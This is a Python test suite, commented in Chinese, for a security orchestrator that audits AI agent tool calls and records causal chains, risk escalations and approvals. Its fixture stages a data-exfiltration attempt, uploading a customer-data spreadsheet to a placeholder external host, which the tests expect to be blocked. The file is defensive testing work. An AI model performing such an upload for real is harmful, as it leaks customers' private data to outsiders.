"""
Phase1 结构化审计链测试（Session/Chain/Call 薄聚合 + 因果边 + 风险升级）。

覆盖：
- audit_sessions / audit_chains / audit_calls 薄聚合表写入与终态
- 事件 parent_event_id / trigger_event_id 因果边
- risk_escalations（from→to / delta / dominant）
- 审批回填 event_uuid
- get_audit_tree 树形组装与 causal_path（回答“为什么 block/kill”）
"""

import tempfile
from pathlib import Path

from src.security.security_logger import SecurityLogger
from src.security.orchestrator import SecurityOrchestrator


def _run_golden():
    tmp = Path(tempfile.mkdtemp(prefix="p1_graph_"))
    logger = SecurityLogger(db_path=tmp / "graph.db")
    orc = SecurityOrchestrator(security_logger=logger)
    session = "p1-graph-golden"

    read = orc.check_tool_call(
        session, "read_document", {"file_path": "客户资料.xlsx"},
        agent_id="admin_agent",
    )
    assert read["action"] == "review"
    logger.resolve_approval(read["approval_id"], "approve",
                            reviewer="tester", comment="ok")
    logger.log_execution_outcome(read["correlation"]["call_id"], True)

    exfil = orc.check_tool_call(
        session, "upload_data",
        {"data": "客户资料.xlsx", "target": "http://external.example.com"},
        agent_id="admin_agent",
    )
    assert exfil["action"] in ("block", "kill")
    return logger, session, read, exfil


def test_phase1_aggregate_tables_written():
    logger, session, read, exfil = _run_golden()
    tree = logger.get_audit_tree(session)
    # session / chain
    assert tree["session"]["status"] == "open"
    assert tree["chain"]["chain_type"] in ("data_exfiltration", "behavior_chain")
    assert tree["chain"]["final_disposition"] == exfil["action"]
    assert abs(tree["chain"]["final_risk"] - exfil["risk_score"]) < 1e-6
    # calls
    call_ids = {c["call_id"] for c in tree["calls"]}
    assert read["correlation"]["call_id"] in call_ids
    assert exfil["correlation"]["call_id"] in call_ids


def test_phase1_causal_links():
    logger, session, read, exfil = _run_golden()
    tree = logger.get_audit_tree(session)
    kill_call = next(c for c in tree["calls"]
                     if c["call_id"] == exfil["correlation"]["call_id"])
    decision = kill_call["decision"]
    # 决策行的 trigger 应指向上一决策（read review）
    assert decision["trigger_event_id"] == read["correlation"]["call_id"] or \
           decision["trigger_event_id"] is not None
    # causal_path 应包含 read 决策与 kill 决策（可回答“为什么 kill”）
    types = [x["event_type"] for x in kill_call["causal_path"]]
    assert "behavior_chain" in types
    assert decision["event_uuid"] in [x["event_uuid"] for x in kill_call["causal_path"]]


def test_phase1_risk_escalation():
    logger, session, read, exfil = _run_golden()
    escal = logger.get_escalations(session_id=session)
    assert escal, "应至少存在一条风险升级记录"
    last = escal[-1]
    assert abs((last["to_score"] - last["from_score"]) - last["delta"]) < 1e-6
    assert last["to_score"] > last["from_score"]
    assert last["decision"] == exfil["action"]


def test_phase1_approval_event_uuid_backfilled():
    logger, session, read, exfil = _run_golden()
    approval = logger.get_approval(read["approval_id"])
    assert approval["event_uuid"], "审批应回填决策事件 event_uuid"
    call = logger.get_call(read["correlation"]["call_id"])
    dec = call["decision"]
    assert approval["event_uuid"] == dec["event_uuid"]


def test_phase1_call_meta_ended_for_block():
    logger, session, read, exfil = _run_golden()
    with __import__("sqlite3").connect(str(logger.db_path)) as conn:
        conn.row_factory = __import__("sqlite3").Row
        row = conn.execute(
            "SELECT * FROM audit_calls WHERE call_id = ?",
            (exfil["correlation"]["call_id"],),
        ).fetchone()
    assert row is not None
    assert row["decision"] == exfil["action"]
    assert row["execution_status"] in ("NOT_EXECUTED",)
    assert row["ended_at"] is not None
